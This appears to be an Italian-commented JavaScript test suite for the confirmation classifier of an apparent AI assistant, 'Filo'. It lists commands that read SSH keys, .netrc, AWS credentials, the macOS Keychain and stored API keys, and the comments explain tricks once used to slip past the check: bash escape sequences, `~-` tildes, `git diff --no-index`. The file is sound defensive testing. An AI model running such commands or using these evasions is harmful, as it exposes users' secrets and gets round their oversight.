  // chiedere un OK spiegando «"credentials" contiene chiavi o password» sarebbe
  // di nuovo una spiegazione falsa (il rilievo chiuso al giro 2).
  for (const cmd of [
    'grep -e credentials appunti.txt',
    'grep --regexp=passwd appunti.txt',
    'Select-String -Pattern:shadow appunti.txt',
    'findstr /C:password appunti.txt',
  ]) {
    assert.equal(C.classify(cmd, dove()), 1, `"${cmd}" non deve chiedere niente`);
  }
});

test('#587 — i drive di PowerShell non sono cartelle dentro la home', () => {
  for (const cmd of [
    'Get-ItemProperty HKCU:\\Software\\Filo',
    'Get-ChildItem HKLM:\\SOFTWARE',
    'Get-Content Env:\\PATH',
    'Get-ChildItem Env:',
    'Get-ChildItem Cert:\\CurrentUser',
  ]) {
    assert.equal(C.classify(cmd, dove(WIN, WIN)), 2, `"${cmd}" deve chiedere un OK`);
  }
  // Un disco vero e un file con i due punti nel nome restano letture normali.
  assert.equal(C.classify('type C:\\Users\\mario\\note.txt', dove(WIN, WIN)), 1);
  assert.equal(C.classify('cat nota:2026.txt', dove()), 1);
});

test('#587 — con una shell Windows dichiarata la barra resta un separatore', () => {
  const win = { perimetro: WIN, home: WIN, cwd: WIN, shell: 'powershell' };
  for (const cmd of [
    'type .\\ssh',                    // una cartella che si chiama "ssh", senza punto
    'dir .\\config',
    'type Documenti\\note.txt',
    'gc App\\Data',
  ]) {
    assert.equal(C.classify(cmd, win), 1, `"${cmd}" su PowerShell non deve chiedere niente`);
  }
  // La stessa riga con bash dichiarata apre davvero un bersaglio riservato.
  assert.equal(C.classify('type .\\ssh', { perimetro: HOME, home: HOME, cwd: HOME, shell: 'bash' }), 2);
});

test('#587 — le letture di tutti i giorni non chiedono niente (giro 3)', () => {
  for (const cmd of [
    'cat appunti.txt',
    'cat *.txt',
    'head -5 Documenti/*.csv',
    'ls -la',
    'ls -R progetto',
    'grep credentials appunti.txt',
    'wc -l Documenti/bilancio.csv',
    'cat progetto/src/index.js',
    'Get-Content -Raw log.txt',
    'gci -Filter *.js -Force',
  ]) {
    assert.equal(C.classify(cmd, dove()), 1, `"${cmd}" non deve chiedere niente`);
  }
  for (const cmd of ['type Documenti\\note.txt', 'dir progetto\\src']) {
    assert.equal(C.classify(cmd, dove(WIN, WIN)), 1, `"${cmd}" non deve chiedere niente`);
  }
});

// ── #587, giro 4 — la cassetta dei segreti di un Mac, e gli escape di bash ───
//
// Due strade, stessa causa dei giri prima: quello che viene misurato non è
// quello che il comando aprirà.
//
// La prima è una piattaforma intera. I bersagli riservati si riconoscono dal
// nome — `.ssh`, `.config`, `AppData` — ma su macOS i segreti non stanno in
// cartelle nascoste: stanno tutti in `~/Library` (le chiavi API e il portafoglio
// di Filo in «Application Support/Filo/storage.json», il portachiavi, le
// password dei browser, la posta). Lo stesso file di Filo chiedeva un OK su
// Linux e su Windows e non chiedeva niente su un Mac.
//
// La seconda sono le sequenze di escape dentro `$'…'`: lì bash non toglie solo
// le barre rovesciate, scioglie anche `\x68`, `\150` e `h`, che sono tutte
// e tre la lettera «h». Il giro 3 aveva tolto le virgolette senza leggere il
// contenuto, quindi `cat $'.ss\x68/config'` apriva `~/.ssh/config` mentre il
// controllo leggeva `.ssx68`.
//
// Senza il fix ognuno di questi assert torna 1 al posto di 2.
const MAC = '/Users/mario';
const doveMac = { perimetro: MAC, home: MAC, cwd: MAC, shell: 'bash' };

test('#587 — su un Mac la cartella Library non è una cartella qualunque', () => {
  for (const cmd of [
    'cat "Library/Application Support/Filo/storage.json"',
    'cat Library/Application\\ Support/Filo/storage.json',
    'cat ~/Library/Application\\ Support/Filo/storage.json',
    'cat Library/Keychains/login.keychain-db',
    'cat "Library/Application Support/Firefox/Profiles/ab.default/logins.json"',
    'cat Library/Messages/chat.db',
    'grep -r password Library',
    'ls -R Library',
    'cd Library/Application\\ Support/Filo && cat storage.json',
    'cat Libr*/Keychains/login.keychain-db',
  ]) {
    assert.equal(C.classify(cmd, doveMac), 2, `"${cmd}" deve chiedere un OK`);
  }
  // Stessa regola per l'altra strada, «leggi questo file».
  assert.notEqual(
    C.pathReason(`${MAC}/Library/Application Support/Filo/storage.json`,
      { perimetro: MAC, home: MAC, cwd: MAC, soloRiservati: true }), '',
    'anche leggendolo come documento deve dare un motivo',
  );
  // `Library` più in giù è una cartella qualunque, e non deve costare niente.
  assert.equal(C.classify('cat progetto/Library/indice.txt', doveMac), 1);
  for (const cmd of ['cat appunti.txt', 'cat Documents/bolletta.pdf', 'ls -la', 'head -5 Documents/*.csv']) {
    assert.equal(C.classify(cmd, doveMac), 1, `"${cmd}" non deve chiedere niente`);
  }
});

test('#587 — le sequenze di escape di bash non nascondono il bersaglio', () => {
  const dovunque = { perimetro: HOME, home: HOME, cwd: HOME, shell: 'bash' };
  for (const cmd of [
    "cat $'.ss\\x68/config'",
    "cat $'.ss\\150/config'",
    "cat $'.ss\\u0068/config'",
    "cat $'.netr\\x63'",
    "cat $'.git-credential\\x73'",
    "cat $'.confi\\x67/Filo/storage.json'",
    "grep -h . $'.ss\\x68/config'",
    "cd $'.ss\\x68' && cat config",
    "ls $'.ss\\x68'",
  ]) {
    assert.equal(C.classify(cmd, dovunque), 2, `"${cmd}" deve chiedere un OK`);
  }
  // Le stesse virgolette sono anche il modo normale di scrivere un nome con uno
  // spazio dentro: lì non devono chiedere niente.
  for (const cmd of ["cat $'appunti.txt'", "cat $'Documenti/nota di spesa.txt'"]) {
    assert.equal(C.classify(cmd, dovunque), 1, `"${cmd}" non deve chiedere niente`);
  }
});

// ── #587, giro 5 — chi legge e non veniva misurato, e le altre tildi ─────────
//
// Due porte, stesso danno: chiavi e password che escono senza un clic.
//
// La prima è un cambio di verso. Il bersaglio veniva misurato solo per i
// programmi scritti in un elenco di lettori; chi non c'era passava senza che
// nessuno guardasse cosa aprisse. `git diff --no-index /dev/null ~/.ssh/id_rsa`
// stampa la chiave privata, `git diff --no-index vuota ~/.ssh` la cartella
// intera, `git grep --no-index` cerca dentro tutti i file dell'utente: tutto a
// livello 1. Adesso si misura tutto e si tace solo su chi NON PUÒ aprire un
// percorso, così un programma nuovo sbaglia dalla parte della conferma.
//
// La seconda è la stessa causa dei quattro giri prima — il bersaglio misurato
// non è quello che il comando aprirà — affacciata sulle tildi che non sono la
// cartella dell'utente: `~-` è la cartella di PRIMA, `~1` una di quelle messe da
// parte con `pushd`. «vai in .ssh», «torna a casa», «mostrami ~-/config» apriva
// la configurazione SSH senza chiedere niente.
//
// Senza il fix i primi assert tornano 1.
test('#587 — anche i programmi fuori dall’elenco dei lettori vengono misurati', () => {
  const dovunque = { perimetro: HOME, home: HOME, cwd: HOME, shell: 'bash' };
  for (const cmd of [
    'git diff --no-index /dev/null .ssh/id_rsa',
    'git diff --no-index /dev/null ~/.ssh/id_rsa',
    'git diff --no-index /dev/null .netrc',
    'git diff --no-index /dev/null .config/Filo/storage.json',
    'git diff --no-index vuota .ssh',
    'git diff --no-index vuota .aws',
    'git diff --no-index /dev/null /etc/passwd',
    'git grep --no-index -e PRIVATE',
    'git grep --no-index -e AKIA -- .aws',
    'git grep --no-index password',
  ]) {
    assert.equal(C.classify(cmd, dovunque), 2, `"${cmd}" apre file riservati: deve chiedere un OK`);
  }
});

test('#587 — l’uso di tutti i giorni di git non chiede niente', () => {
  const dovunque = { perimetro: HOME, home: HOME, cwd: HOME, shell: 'bash' };
  for (const cmd of [
    'git status', 'git log', 'git log -p', 'git log --oneline', 'git diff',
    'git diff --stat', 'git diff HEAD~1', 'git show HEAD', 'git branch',
    'git blame src/main.js', 'git log --grep=passwd', 'npm ls', 'npm config get registry',
    'git diff --no-index vecchio.txt nuovo.txt',
  ]) {
    assert.equal(C.classify(cmd, dovunque), 1, `"${cmd}" è lavoro di tutti i giorni: non deve chiedere niente`);
  }
});

test('#587 — la cartella di prima (`~-`, `~1`) non nasconde il bersaglio', () => {
  const dovunque = { perimetro: HOME, home: HOME, cwd: HOME, shell: 'bash' };
  for (const cmd of [
    'cat ~-/config',
    'cat ~-/Filo/storage.json',
    'ls ~-',
    'cat ~1/config',
    'cat ~+1/config',
    'cat ~-2/id_ed25519',
    'cd .ssh && cd ~ && cat ~-/config',
    'cd ~- && cat config',
    'cat ~altroutente/Documenti/nota.txt',
  ]) {
    assert.equal(C.classify(cmd, dovunque), 2, `"${cmd}" deve chiedere un OK`);
  }
  // Spostarsi e basta non legge niente: non deve costare nulla.
  assert.equal(C.classify('cd ~-', dovunque), 1, 'spostarsi non deve chiedere niente');
  // `~+` è la cartella corrente, che si sa già misurare.
  assert.equal(C.classify('cat ~+/appunti.txt', dovunque), 1, '`~+` è dove siamo: non deve chiedere niente');
});
